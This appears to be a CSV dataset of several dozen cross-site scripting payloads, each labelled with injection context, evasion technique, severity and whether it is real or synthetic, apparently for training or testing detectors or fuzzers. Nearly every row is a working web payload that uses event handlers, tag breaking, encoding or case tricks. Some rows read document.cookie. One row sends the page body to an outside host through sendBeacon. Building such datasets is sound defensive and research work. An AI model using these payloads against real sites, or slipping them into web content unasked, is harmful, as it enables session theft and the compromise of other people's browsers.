payload,context,technique,severity,length,source
"""><svg ontoggle=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,59,synthetic
<legend onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,68,real
<svg%0Ao%00nload=%09((pro\u006dpt))()//,tag_injection,unicode_escape|url_encoding,low,39,real
' onmouseenter=confirm(document.domain) ',attribute_escape,synthetic,medium,41,synthetic
<template id=x tabindex=1 onfocus=alert(1)></template>,event_handler,none,medium,54,real
%3Cscript%3E/*/console.log('XSS')%3C/script%3E,script_injection,synthetic,medium,46,synthetic
"<scr	ipt>confirm`String.fromCharCode(88,83,83)`</scr	ipt>",script_injection,synthetic,medium,57,synthetic
"<details draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</details>",event_handler,none,medium,72,real
"<SCRIPT SRC=""%(jpg)s""></SCRIPT>",script_injection,case_variation,low,31,real
' ontoggl&#101;=confirm(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,medium,48,synthetic
"<output onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</output>",event_handler,none,medium,65,real
"<style><img src=""</style><img src=x onerror=alert(XSS)//"">",event_handler,none,medium,58,real
themecolor=%22-alert('AnonKryptiQuz')-%22,generic,url_encoding,medium,41,real
"<data draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</data>",event_handler,none,medium,66,real
""" oNfoCus=prOmpT(1) aUtoFocUs=""",attribute_escape,synthetic,medium,31,synthetic
"<svG oNclIck=coNfiRm(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection,synthetic,medium,53,synthetic
%22><svg onbegin=confirm(%27XSS%27)>,tag_injection,synthetic,medium,36,synthetic
<svg ontoggle=prompt(location.hash)/>,tag_injection,synthetic,medium,37,synthetic
"<script onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</script>",script_injection,none,medium,73,real
"<div draggable=""true"" contenteditable>drag me</div><marquee ondragover=alert(1) contenteditable style=display:block>drop here</marquee>",event_handler,none,medium,135,real
-setTimeout`prompt\u0028document.domain\u0029`-',dom_sink,unicode_escape,low,48,real
"<style id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></style>",event_handler,none,medium,86,real
"<track onmouseover=""alert(1)"">AnonKryptiQuz</track>",event_handler,none,medium,51,real
"<samp draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</samp>",event_handler,none,medium,84,real
<script>//\u0061lert(document.cookie)</script>,script_injection,synthetic,medium,46,synthetic
"<body onpagehide=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",dom_sink,obfuscation,medium,93,real
"<div onpointerup=""alert(45)"">MOVE HERE</div>",event_handler,none,medium,44,real
"<a href=""javas\x0Ccript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
"<BR SIZE=""&{alert('AnonKryptiQuz')}"">",attribute_escape,case_variation,medium,37,real
"eval(""prompt(location.hash)"")",dom_sink,synthetic,medium,29,synthetic
"<style>:target {color: red;}</style><element id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></element>",event_handler,none,medium,117,real
"<ul onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</ul>",event_handler,none,medium,63,real
"<style>@keyframes x{}</style><input3 style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></input3>",event_handler,none,medium,105,real
"%27 onmouseenter=prompt(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,medium,58,synthetic
"""><Svg onMouSeoVer=coNsoLe.Log('XSS')>",tag_injection,synthetic,medium,38,synthetic
"<map draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</map>",event_handler,none,medium,64,real
"<style>:target {color:red;}</style><video id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></video>",event_handler,none,medium,114,real
<data onpointerover=alert(1) style=display:block>AnonKryptiQuz</data>,event_handler,none,medium,69,real
<dialog onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</dialog>,event_handler,none,medium,78,real
<scr<script>ipt>alert(1)</scr</script>ipt>,script_injection,none,medium,42,real
<IMG SRC=`javascript:javascript:alert(1)`>,js_uri,case_variation,medium,42,real
<sup onpointerup=alert(1) style=display:block>AnonKryptiQuz</sup>,event_handler,none,medium,65,real
"""><Svg onFocUs=AleRt(DocUmeNt.CooKie)>",tag_injection,synthetic,medium,38,synthetic
"<div draggable=""true"" contenteditable>drag me</div><s ondragover=alert(1) contenteditable style=display:block>drop here</s>",event_handler,none,medium,123,real
"<style>@keyframes x{}</style><var style=""animation-name:x"" onwebkitanimationend=""alert(1)""></var>",event_handler,none,medium,97,real
"'&#x3E;'>""><script>alert(2);</script>",script_injection,html_entity,medium,37,real
<button popovertarget=x>Click me</button><br onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</br>,event_handler,none,medium,100,real
"<mark onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</mark>",event_handler,none,medium,63,real
"<html onMouseOut html onMouseOut=""javascript:javascript:alert(9460)""></html onMouseOut>",event_handler,none,medium,87,real
<frame onpointerenter=alert(1) style=display:block>AnonKryptiQuz</frame>,event_handler,none,medium,72,real
"<style>:target {color: red;}</style><header id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></header>",event_handler,none,medium,115,real
"%22><svg onfocus=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,55,synthetic
"<style>@keyframes x{}</style><bdo style=""animation-name:x"" onanimationend=""alert(1)""></bdo>",event_handler,none,medium,91,real
""" onmouseover=prompt('XSS') """,attribute_escape,synthetic,medium,29,synthetic
<input id=x tabindex=1 onactivate=alert(1)></input>,event_handler,none,medium,51,real
"<style>:target {transform: rotate(180deg);}</style><select id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></select>",event_handler,none,medium,130,real
"<summary draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</summary>",event_handler,none,medium,72,real
<td onpointerdown=alert(1) style=display:block>AnonKryptiQuz</td>,event_handler,none,medium,65,real
%3Cimg%20src%3Dx%20onerror%3D%60alert%28%60AnonKryptiQuz%60%29%60%3E,generic,url_encoding,low,68,real
"""><Svg onCliCk=ConFirM(STriNg.FroMChArCOde(88,83,83))>",tag_injection,synthetic,medium,54,synthetic
<xml onreadystatechange=alert(1)>,event_handler,none,medium,33,real
"<hr ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</hr>",event_handler,none,medium,85,real
"&lt;IMG SRC=\""livescript&#058;&#91;code&#93;\""&gt;",generic,html_entity,low,50,real
<menu id=x tabindex=1 ondeactivate=alert(1)></menu><input id=y autofocus>,event_handler,none,medium,73,real
""" oNfoCus=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)) aUtoFocUs=""",attribute_escape,synthetic,medium,64,synthetic
"<section onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</section>",event_handler,none,medium,74,real
<cite onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
"<base draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</base>",event_handler,none,medium,64,real
